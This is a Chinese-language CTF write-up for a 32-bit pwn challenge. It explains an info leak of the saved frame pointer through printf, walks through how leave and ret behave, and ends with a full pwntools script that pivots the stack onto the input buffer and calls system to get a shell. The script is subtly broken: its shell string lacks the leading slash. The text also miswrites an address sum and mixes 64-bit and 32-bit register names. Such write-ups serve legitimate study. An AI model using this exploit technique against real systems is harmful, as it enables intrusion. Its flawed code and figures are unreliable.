## 漏洞分析
这道题的函数结构是： `read->printf->read->printf` 看到两个printf() ， 可以往格式化字符串漏洞去思考。但本题的格式化字符串漏洞，不在于**任意地址写**（%n），而是**信息泄露**（%s）
首先对于这道题，单看栈溢出，属于只能溢出到 `save_rip` ，这是非常有限的，也是栈迁移的极限条件，从这个特征，就可以锁定打栈迁移的思路了。
但本题中，并没有全局变量让我们写入到 .bss/.data段，两次read写入的都是**栈上**的 `s` ，emmmm虽然是马后炮，但确实，思路的下一步是把ROP写到栈上。
如果想到这一步，就能明白为什么题目会给两个 `read()` 了，目的就是 **信息泄漏+栈迁移地址确定** 
## 解题步骤
### ① 静态分析
![image.png](https://chenhun.oss-cn-beijing.aliyuncs.com/photo/202512211828851.png)
我们聚焦到 `read()` 函数，最多读取<font color="#e36c09"> 0x30</font>
- 特点：这是一个系统调用，通常用于文件I/O或套接字编程，是底层函数。它不会在数据末尾自动添加字符串结束符'\0'，因此读取的数据可能是任意二进制数据，不一定构成字符串。

注意这个程序是32位，所以一个栈帧占4 bytes，溢出到 `save_rip` 。
至此，图中只有第五行代码我们没有关注过
`memset`是C语言标准库中的一个内存操作函数，用于将一块内存区域的内容设置为指定的值。
**函数原型：**
```c
#include <string.h>
void *memset(void *ptr, int value, size_t num);
```
参数说明:
1. **ptr**：指向要填充的内存块的指针
2. **value**：要设置的值（以int形式传递，但实际使用时会被转换为unsigned char）
3. **num**：要填充的字节数

这里出题人的意图是什么？我一开始也没想道，但后面调试时想明白了。
	在程序的视角中： `\x00` ， `0` ， `NULL` 其实是等价的！！！
所以这里将前0x20个字节置为0是为了不让 `printf()` 函数泄漏栈地址！
![image.png](https://chenhun.oss-cn-beijing.aliyuncs.com/photo/202512211847599.png)
如图，只要我们在第一组 read + printf 组合输入超过 `0x20` bytes就够覆盖所有 `\x00` 了，也就做到的泄漏 `save_rbp` 地址的目的，而我 exp 中选择填满 0x28 是为了直接接收关键数据，把垃圾数据都覆盖掉。
### ② 动态调试  
动调部分，我打算记录一下整个栈迁移的过程，深入理解 `leave` `ret` 的组合拳。
![image.png](https://chenhun.oss-cn-beijing.aliyuncs.com/photo/202512211857972.png)
为了头脑不晕，我们只关注一个指令的行为即可。先理解 `leave` 指令：
#### leave
`LEAVE` 用于恢复函数调用前的栈帧，相当于清理局部变量和恢复旧的 RBP。  
等效行为：
```
mov rsp, rbp
pop rbp
```
注意到第二，四条指令的截图（此时是刚执行完一，三条指令后的寄存器状态）的ESP值。
可以看到，ESP总是执行前 `EBP + 4` 的结果：
	`0xffbd2688 + 4 = 0xffdb268c`
	`0xffbd2660 + 4 = 0xffbd2664`
为什么呢？原因在 `pop` 指令
32 位POP：
```
操作数 = [esp]
esp = esp + 4
```
这里会让 `esp` 上移。其实也很好理解，就是弹出值给 `ebp` 然后栈缩小，对应的就是 `esp上移` 。
#### ret
RET 从栈顶弹出返回地址并跳转，是函数执行结束后的退出指令。  
等效行为：
```
pop eip
```
二次等价为：
```
eip = [esp]
esp = esp + 4
```
看到了吗？这里把栈顶数据（esp）存放的 `leave(init+47)` 弹出到 eip中！并且再次 `esp + 4` 
所以你可以在第三张指令截图中看到 `esp = 0xffbd268c + 4 = 0xffbd2690` 
### ③ 利用开发
 save_edp = **0xffb8a478 ，也算出 old_edp - 0x10 = edp ，就可以借助** old_edp = **0xffb8a478 ，来精心设计栈上的 布局。**
利用完第一次 read 函数 泄露得到 old_edp ，第二次 read 函数 就来设计 栈的布局。

|old_ebp - 0x38|'aaaa'|
|:-:|:-:|
|old_ebp - 0x34|system_plt|
|old_edp - 0x30|**'aaaa'**|
|old_ebp - 0x2C|old_edp - 0x28|
|old_edp - 0x28|/bin/sh\x00|
|...|...|
|old_edp - 0x10（这里是 ebp）|old_ebp - 0x38|
|old_ebp - 0xC（这里是原本的返回地址ret_addr）|leave ; ret|

第二次 leave 后 ，esp 指向 图片最顶上 "aaaa"（**old_edp - 0x38**）
leave 之后就是 ret ，栈上的·esp 会再向下移 4 个字节，所以 先塞 'A'*4 ，可以理解为用于栈对齐，再接着 system_addr ，这样 esp 刚好从 system_addr 开始执行，有 system_ret_addr 是因为 我们选择跳转的是 system@plt，实际不在栈上。
ps：这是其他师傅的部分wp，可以去参考他细致的思路讲解，我这里主要是补充作用（如果前面我的讲述你没看懂）
[Icyice的CISCN 2019东南PWN2的WP](https://www.nssctf.cn/note/set/12473)
```python
from pwn import *
context.log_level = 'debug'
io = process('./pwn')
# io = remote('node5.anna.nssctf.cn',20667)
io.recv()
str1 = b'a' * 0x27 + b'b'
io.send(str1)
io.recvuntil(b'b')
ord_rbp = hex(u32(io.recvn(4)))
print(f"leak:{ord_rbp}")

backdoor = 0x8048559
system_plt = 0x8048400
rbp = int(ord_rbp,16) - 0x10
print(f"rbp:{hex(rbp)}")
buf_addr = rbp - 0x28
binsh_addr = buf_addr + 0x10
leave_ret = 0x8048593
payload = b'aaaa' + p32(system_plt) + b'bbbb'
payload += p32(binsh_addr) + b'bin/sh\x00'
payload = payload.ljust(0x28,b'\x00')
payload += p32(buf_addr) + p32(leave_ret)

io.send(payload)
io.interactive()
```

## 关键收获
### 技术洞察
栈迁移并不一定要在 `.bss/.data` 段，如果能有新的条件（泄漏 save_rbp） 呢也可以因此有新的方法和思路。
### 踩坑记录
真正理解了 `leave` 与 `ret` 对栈帧的影响。
### 模式识别
- 只能溢出到 `save_rip`
- .bss/.data 段可执行（本题比较创新，并没有这样利用）
- 地址！知道栈迁移的地址是最关键的！ROP是武器，但能准确迁移到目标地址
